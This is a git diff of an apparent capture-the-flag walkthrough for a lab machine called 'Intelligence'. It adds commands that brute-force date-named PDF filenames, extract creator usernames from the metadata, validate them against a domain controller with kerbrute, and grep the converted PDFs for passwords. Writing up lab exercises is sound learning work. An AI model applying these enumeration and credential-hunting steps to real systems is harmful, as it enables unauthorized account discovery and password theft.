@@ -104,7 +104,7 @@ Nmap done: 1 IP address (1 host up) scanned in 100.93 seconds
 
 ---
 
-## Port 80
+## HTTP Port #80
   - Homepage
 ![image](https://user-images.githubusercontent.com/83878909/230812679-60dfc045-321b-4e62-b577-3006e048ab79.png)
 
@@ -116,7 +116,7 @@ Nmap done: 1 IP address (1 host up) scanned in 100.93 seconds
 
 ---
 
-## Brute-Force
+## Brute-Force PDF Filenames
   - Create a wordlist to brute-force the `date`, maybe some other documents exist.
 ```CSS
 ▶ for i in $(seq $(date -d "2020-01-01" +%s) 86400 $(date -d "2021-05-15" +%s)); do date -d @$i "+%Y-%m-%d-upload.pdf"; done > files.txt
@@ -130,7 +130,7 @@ Nmap done: 1 IP address (1 host up) scanned in 100.93 seconds
 
 ---
 
-## Exiftool
+## Exiftool PDF Meta-data
   - PDF files meta-data.
 ![image](https://user-images.githubusercontent.com/83878909/230817269-96fbdaa8-e0a4-48e0-b13e-b00ef8405861.png)
   - Extract creator names from meta-dta of all the PDF files.
@@ -172,8 +172,22 @@ William.Lee
 
 -- 
 
-## Valid Usernames
+## Kerbrute Validate Usernames
 ```CSS
 ▶ kerbrute userenum --dc 10.10.10.248 -d intelligence.htb creators.txt
 ```
 ![image](https://user-images.githubusercontent.com/83878909/230821076-266f1262-a0a6-4d35-bd21-025be8a3c845.png)
+
+---
+
+## Sensitive Information (Passwords)
+  -  Convert all `pdf` files to `text`.
+```CSS
+▶ for i in $(ls); do pdftotext $i; done
+```
+
+  - Passwords
+```CSS
+▶ cat *.txt | grep -i password -B5 -A5
+```
+![image](https://user-images.githubusercontent.com/83878909/230822841-3abc40df-e706-4d56-8fbe-1c1b6a0fcab9.png)
